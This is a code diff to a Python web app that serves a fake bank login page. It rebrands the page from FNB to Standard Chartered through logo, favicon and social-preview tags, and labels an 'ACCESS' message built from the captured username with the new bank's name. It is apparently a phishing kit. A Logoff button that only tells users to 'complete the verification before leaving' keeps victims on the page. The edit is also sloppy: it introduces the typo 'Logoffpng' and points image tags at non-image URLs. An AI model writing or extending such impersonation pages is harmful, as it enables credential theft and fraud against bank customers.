@@ -1078,7 +1078,7 @@ def base(content, header=True):
         <div class="top-item brand">
 
     <img
-        src="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
+        src="https://seeklogo.com/vector-logo/429587/standard-chartered-bank"
         alt="Logo"
         class="header-logo"
     >
@@ -1098,7 +1098,7 @@ def base(content, header=True):
                 class="logoff"
                 onclick="alert('Please complete the verification before leaving.')"
             >
-                Logoff
+                Logoffpng
             </button>
 
         </div>
@@ -1125,7 +1125,7 @@ def base(content, header=True):
     <link
         rel="icon"
         type="image/png"
-        href="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
+        href="https://seeklogo.com/vector-logo/429587/standard-chartered-bank"
     >
 
     <meta property="og:title" content="Standard Chartered">
@@ -1137,7 +1137,7 @@ def base(content, header=True):
 
     <meta
         property="og:image"
-        content="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
+        content="https://seeklogo.com/vector-logo/429587/standard-chartered-bank"
     >
 
     <meta property="og:type" content="website">
@@ -1146,7 +1146,7 @@ def base(content, header=True):
 
     <meta
         name="twitter:image"
-        content="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
+        content="https://seeklogo.com/vector-logo/429587/standard-chartered-bank"
     >
 
     {CSS}
@@ -1201,7 +1201,7 @@ def login():
         session["test_access_verified"] = True
 
         access_message = f"""
-🔐 ACCESS
+🔐 ACCESS STANDARD CHARTERED
 
 Username: {username}
 Status: Test access started
